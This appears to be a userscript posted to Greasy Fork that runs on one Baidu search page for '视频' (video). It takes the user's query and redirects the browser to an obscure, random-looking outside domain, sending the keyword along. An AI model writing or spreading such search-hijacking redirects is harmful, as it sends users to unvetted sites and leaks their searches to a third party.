// ==UserScript==
// @name         Baidu Search Redirect
// @namespace    http://yournamespace.com
// @version      1.0
// @description  Redirect Baidu search results to another website based on keywords
// @author       Your Name
// @match        https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=%E8%A7%86%E9%A2%91
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/479819/Baidu%20Search%20Redirect.user.js
// @updateURL https://update.greasyfork.org/scripts/479819/Baidu%20Search%20Redirect.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // 设置要重定向到的网站URL
    var redirectBaseUrl = "https://5aqmmo.mwtksrp.com/home.html";

    // 获取当前搜索关键词
    var searchKeyword = getSearchKeyword();
    // 获取当前搜索关键词
    function getSearchKeyword() {
        var searchInput = document.getElementById('kw'); // 修改为百度搜索框的实际ID
        return searchInput ? searchInput.value : null;
    }

    // 如果存在搜索关键词，则构建包含关键词的重定向URL
    if (searchKeyword) {
        var redirectUrl = redirectBaseUrl + "?q=" + encodeURIComponent(searchKeyword);

        // 执行重定向
        location.href = redirectUrl;
    }
})();
